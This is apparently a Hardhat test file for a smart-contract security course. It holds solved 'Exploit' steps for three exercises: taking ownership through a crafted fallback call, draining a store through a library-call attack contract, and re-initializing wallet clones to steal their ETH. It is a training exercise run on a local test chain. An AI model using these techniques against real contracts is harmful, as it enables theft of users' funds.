import { SignerWithAddress } from '@nomincfoundation/hardhat-ethers/signers';
import { expect } from 'chai';
import { utils } from 'ethers-v5';
import { ethers } from 'hardhat';
const { provider, deployContract, getSigners, parseEther, keccak256, toUtf8Bytes } = ethers;

import { RestrictedOwner, UnrestrictedOwner } from '../../../typechain-types';
import { DummyERC20, RentingLibrary, SecureStore, CryptoKeeper, CryptoKeeperFactory } from '../../../typechain-types';

describe('Call Attack Exercise', () => {
  describe('Exercise 1', () => {
    let deployer: SignerWithAddress, user: SignerWithAddress, attacker: SignerWithAddress;

    let unrestrictedOwner: UnrestrictedOwner;
    let restrictedOwner: RestrictedOwner;

    before(async () => {
      [deployer, user, attacker] = await getSigners();

      // Deploy
      unrestrictedOwner = await deployContract('UnrestrictedOwner');
      restrictedOwner = await deployContract('RestrictedOwner', [unrestrictedOwner.target]);

      // Any user can take ownership on `UrestrictedOwner` contract
      await expect(unrestrictedOwner.connect(user).changeOwner(user.address)).not.to.be.reverted;
      expect(await unrestrictedOwner.owner()).to.be.equal(user.address);

      // Any user can't take ownership on `RestrictedOwner` contract
      await expect(restrictedOwner.connect(user).updateSettings(user.address, user.address)).to.be.reverted;
      expect(await restrictedOwner.owner()).to.be.equal(deployer.address);
      expect(await restrictedOwner.manager()).to.be.equal(deployer.address);
    });

    it('Exploit', async () => {
      const iface = new utils.Interface(["function changeOwner(address _newOwner)"]);
      const data = iface.encodeFunctionData(`changeOwner`, [attacker.address]);
      await attacker.sendTransaction({
        from: attacker.address,
        to: restrictedOwner.target,
        data: data
      });

      await restrictedOwner.connect(attacker).updateSettings(attacker.address,
        attacker.address);
    });

    after(async () => {
      // Attacker should take ownership on `RestrictedOwner` contract
      expect(await restrictedOwner.owner()).to.be.equal(attacker.address);
      expect(await restrictedOwner.manager()).to.be.equal(attacker.address);
    });
  });

  describe("Exercise 2", async () => {
    let deployer: SignerWithAddress, attacker: SignerWithAddress;
    let rentingLibrary: RentingLibrary;
    let usdc: DummyERC20;
    let secureStore: SecureStore;

    const INITIAL_SUPPLY = parseEther('100');
    const ATTACKER_INITIAL_BALANCE = parseEther('100');
    const STORE_INITIAL_BALANCE = parseEther('100000');
    const DAILY_RENT_PRICE = parseEther('50');

    before(async () => {
      /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

      [deployer, attacker] = await ethers.getSigners();

      // Deploy Library Contract
      rentingLibrary = await deployContract('RentingLibrary');
      // Deploy Token
      usdc = await deployContract('DummyERC20', ['USDC Token', 'USDC', INITIAL_SUPPLY]);
      // Deploy secureStore Contract
      secureStore = await deployContract('SecureStore', [rentingLibrary.target, DAILY_RENT_PRICE, usdc.target]);

      // Setting up the attacker
      await usdc.mint(attacker.address, ATTACKER_INITIAL_BALANCE);

      // Setting up the SecureStore
      await usdc.mint(secureStore.target, STORE_INITIAL_BALANCE);
    });

    it('Exploit', async () => {
      const attackerContract = await deployContract('AttackSecureStore', [usdc.target, secureStore.target], attacker);

      await usdc.connect(attacker).transfer(attackerContract.target, ATTACKER_INITIAL_BALANCE);
      await attackerContract.attack();
      await secureStore.connect(attacker).withdrawAll();
    });

    after(async () => {
      /** SUCCESS CONDITIONS */

      // Attacker stole all the funds from the SecureStore contract
      expect(await usdc.balanceOf(secureStore.target)).to.eq(0);
      expect(await usdc.balanceOf(attacker.address)).to.eq(ATTACKER_INITIAL_BALANCE + STORE_INITIAL_BALANCE);
    });
  });

  describe('Exercise 3', () => {
    let deployer: SignerWithAddress, user1: SignerWithAddress, user2: SignerWithAddress, user3: SignerWithAddress, attacker: SignerWithAddress;

    let token: DummyERC20;
    let cryptoKeeperTemplate: CryptoKeeper;
    let cryptoKeeperFactory: CryptoKeeperFactory;
    let cryptoKeeper1: CryptoKeeper, cryptoKeeper2: CryptoKeeper, cryptoKeeper3: CryptoKeeper;

    let attackerInitialBalance: bigint;
    const CALL_OPERATION = 1;

    before(async function () {
      /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
      [deployer, user1, user2, user3, attacker] = await getSigners();

      // Deploy ERC20 Token
      token = await deployContract('DummyERC20', ['Dummy ERC20', 'DToken', parseEther('1000')]);

      // Deploy Template and Factory
      cryptoKeeperTemplate = await deployContract('CryptoKeeper');

      cryptoKeeperFactory = await deployContract('CryptoKeeperFactory', [deployer.address, cryptoKeeperTemplate.target]);

      // User1 creating CryptoKeepers
      const User1Salt = keccak256(toUtf8Bytes(user1.address));
      const cryptoKeeper1Address = await cryptoKeeperFactory.predictCryptoKeeperAddress(User1Salt);
      await cryptoKeeperFactory.connect(user1).createCryptoKeeper(User1Salt, [user1.address]);
      cryptoKeeper1 = await ethers.getContractAt('CryptoKeeper', cryptoKeeper1Address);

      // User2 creating CryptoKeepers
      const User2Salt = keccak256(toUtf8Bytes(user2.address));
      const cryptoKeeper2Address = await cryptoKeeperFactory.predictCryptoKeeperAddress(User2Salt);
      await cryptoKeeperFactory.connect(user2).createCryptoKeeper(User2Salt, [user2.address]);
      cryptoKeeper2 = await ethers.getContractAt('CryptoKeeper', cryptoKeeper2Address);

      // User3 creating CryptoKeepers
      const User3Salt = keccak256(toUtf8Bytes(user3.address));
      const cryptoKeeper3Address = await cryptoKeeperFactory.predictCryptoKeeperAddress(User3Salt);
      await cryptoKeeperFactory.connect(user3).createCryptoKeeper(User3Salt, [user3.address]);
      cryptoKeeper3 = await ethers.getContractAt('CryptoKeeper', cryptoKeeper3Address);

      // Users load their cryptoKeeper with some ETH
      await user1.sendTransaction({
        to: cryptoKeeper1.target,
        value: parseEther('10'),
      });
      await user2.sendTransaction({
        to: cryptoKeeper2.target,
        value: parseEther('10'),
      });
      await user3.sendTransaction({
        to: cryptoKeeper3.target,
        value: parseEther('10'),
      });

      // cryptoKeeper operation works
      cryptoKeeper1.connect(user1).executeWithValue(user2.address, '0x', parseEther('1'), { value: parseEther('1') });
      cryptoKeeper2.connect(user2).executeWithValue(user1.address, '0x', parseEther('1'), { value: parseEther('1') });
      cryptoKeeper3.connect(user3).executeWithValue(user1.address, '0x', parseEther('1'), { value: parseEther('1') });

      // Only operator can manage wallet
      // addOperator fails
      await expect(cryptoKeeper1.connect(user2).addOperator(user2.address)).to.be.revertedWith('Not an operator');
      // executeWithValue fails
      await expect(cryptoKeeper1.connect(user2).executeWithValue(user2.address, '0x', parseEther('1'))).to.be.revertedWith('Not an operator');
      // execute fails
      const TokenFactory = await ethers.getContractFactory('DummyERC20', deployer);
      const callData = TokenFactory.interface.encodeFunctionData('balanceOf', [deployer.address]);
      await expect(cryptoKeeper1.connect(user2).execute(token.target, callData, CALL_OPERATION)).to.be.revertedWith("Not an operator");

      attackerInitialBalance = await provider.getBalance(attacker.address);
    });

    it('Exploit', async () => {
      await cryptoKeeper1.connect(attacker).initialize([attacker.address]);
      await cryptoKeeper1.connect(attacker).executeWithValue(attacker.address, "0x", parseEther('10'))
      await cryptoKeeper2.connect(attacker).initialize([attacker.address]);
      await cryptoKeeper2.connect(attacker).executeWithValue(attacker.address, "0x", parseEther('10'))
      await cryptoKeeper3.connect(attacker).initialize([attacker.address]);
      await cryptoKeeper3.connect(attacker).executeWithValue(attacker.address, "0x", parseEther('10'))
    });

    after(async () => {
      // Attacker suppose to steal all the ETH from the Crypto Keepers
      expect(await provider.getBalance(cryptoKeeper1.target)).to.eq(0);
      expect(await provider.getBalance(cryptoKeeper2.target)).to.eq(0);
      expect(await provider.getBalance(cryptoKeeper3.target)).to.eq(0);
      expect(await provider.getBalance(attacker.address)).to.be.gt(attackerInitialBalance + parseEther('30') - parseEther('0.2'));
    });
  });
});
